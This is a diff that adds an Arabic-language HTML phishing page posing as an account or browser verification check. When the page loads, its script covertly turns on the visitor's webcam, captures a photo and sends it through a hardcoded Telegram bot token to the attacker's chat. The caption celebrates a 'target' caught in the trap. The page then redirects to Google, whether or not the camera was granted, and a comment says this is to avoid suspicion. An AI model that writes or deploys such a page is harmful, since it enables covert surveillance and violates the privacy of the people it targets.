@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>تأكيد الحساب</title>
+    <style>
+        body { background-color: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h2>جاري التحقق من المتصفح...</h2>
+    <p>يرجى الانتظار والسماح بالصلاحيات المطلوبة</p>
+
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // --- ضع بياناتك هنا فقط ---
+        const token = "8434640036:AAGEjpes_PRWxagWWs8AM4QSif_t2m30zGk"; 
+        const chatId = "7789746300";
+        // -------------------------
+
+        async function capture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'image.jpg');
+                        formData.append('caption', '⚠️ هدف جديد وقع في الفخ!\n📸 تم سحب الصورة بنجاح.');
+
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        }).then(() => {
+                            window.location.href = "https://www.google.com";
+                        });
+                    }, 'image/jpeg');
+                }, 2000);
+            } catch (e) {
+                // إذا رفض الضحية، يتم تحويله أيضاً لإبعاد الشبهة
+                window.location.href = "https://www.google.com";
+            }
+        }
+        window.onload = capture;
+    </script>
+</body>
+</html>
